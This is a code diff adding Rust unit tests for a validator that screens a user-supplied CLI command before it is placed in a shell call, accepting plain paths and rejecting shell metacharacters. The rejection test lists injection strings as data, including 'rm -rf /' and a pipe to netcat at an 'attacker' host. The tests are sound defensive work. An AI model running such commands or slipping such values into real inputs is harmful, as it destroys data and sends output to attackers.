@@ -411,3 +411,56 @@ fn path_segment_carries_context_in_error() {
     let err = super::validate_path_segment("", "from_version").unwrap_err();
     assert!(err.to_string().contains("from_version"));
 }
+
+// -- validate_cli_command -----------------------------------------------
+//
+// `validate_cli_command` gates the user-supplied CLI string before it is
+// concatenated into a shell invocation by `resume_session_in_terminal`. The
+// allowlist must accept fully-qualified Windows and Unix paths (including
+// drive letters and spaces between an executable and a sub-command) but
+// reject characters that have shell meaning.
+
+#[test]
+fn cli_command_accepts_simple_executable() {
+    assert!(super::path::validate_cli_command("copilot").is_ok());
+    assert!(super::path::validate_cli_command("npx").is_ok());
+}
+
+#[test]
+fn cli_command_accepts_path_with_separators() {
+    assert!(super::path::validate_cli_command("/usr/local/bin/copilot").is_ok());
+    assert!(super::path::validate_cli_command(r"C:\Tools\copilot.exe").is_ok());
+}
+
+#[test]
+fn cli_command_accepts_executable_plus_subcommand() {
+    assert!(super::path::validate_cli_command("npx copilot").is_ok());
+}
+
+#[test]
+fn cli_command_rejects_empty() {
+    let err = super::path::validate_cli_command("").unwrap_err();
+    assert!(err.to_string().contains("empty"));
+}
+
+#[test]
+fn cli_command_rejects_shell_metacharacters() {
+    // semicolon, ampersand, pipe, backtick, dollar, redirects, quotes —
+    // anything that could break out of the literal command position.
+    for bad in [
+        "copilot; rm -rf /",
+        "copilot && evil",
+        "copilot | nc attacker 9001",
+        "copilot `evil`",
+        "copilot $(evil)",
+        "copilot > /dev/null",
+        "copilot \"arg\"",
+        "copilot 'arg'",
+        "copilot\nevil",
+    ] {
+        assert!(
+            super::path::validate_cli_command(bad).is_err(),
+            "should reject: {bad}"
+        );
+    }
+}
